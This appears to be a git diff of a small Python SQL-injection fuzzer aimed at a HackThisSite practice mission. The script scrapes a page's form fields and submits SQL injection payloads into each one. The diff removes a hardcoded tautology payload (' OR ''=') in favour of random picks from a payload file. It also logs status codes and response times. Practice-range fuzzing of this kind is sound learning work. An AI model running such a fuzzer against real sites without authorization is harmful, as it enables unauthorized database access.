@@ -1,6 +1,8 @@
 import requests
 from bs4 import BeautifulSoup
 
+import random # These lines and their use in lines 66,67 are temporary until I finalize the sql_creator
+PAYLOADS = "sql_bank.txt"
 
 def get_input_fields(URL):
 	"""
@@ -41,7 +43,7 @@ def send_data(URL, params):
 	form_tag = form_tag[0]
 
 	# Sends the response to the URL
-	if "method" in form_tag.attrs and form_tag["method"].lower() = "post":
+	if "method" in form_tag.attrs and form_tag["method"].lower() == "post":
 		# Use default - GET
 		r = requests.post(URL, data=params)
 	else:
@@ -51,15 +53,27 @@ def send_data(URL, params):
 	return r.status_code, r.elapsed.total_seconds()
 
 
-if __name__ == '__main__':
-	URL = "https://www.hackthissite.org/missions/realistic/4/" # The URL to check
+def main(URL):
+	"""
+	This function shows how the fuzzer is meant to be used
 
+	:param: URL - This is the url intendent to be checked
+	"""
 	input_fields = get_input_fields(URL) # Saves the unput fields to the list
 
 	# This is where I'll add the corrupted data
 	params = {}
+	sql_file = open(PAYLOADS)
+	sql_payloads = sql_file.readlines()
+
 	for field in input_fields:
-		params[field] = "\' OR \'\'=\'"
+		params[field] = random.choice(sql_payloads)
+		print("Now trying: {0} for field: {1}".format(params[field], field))
 
 	status_code, time_elapsed = send_data(URL, params)
 	print("Status Code: {0}\nTime Elapsed: {1}".format(status_code, time_elapsed))
+
+if __name__ == '__main__':
+	URL = "https://www.hackthissite.org/missions/realistic/4/"
+
+	main(URL)
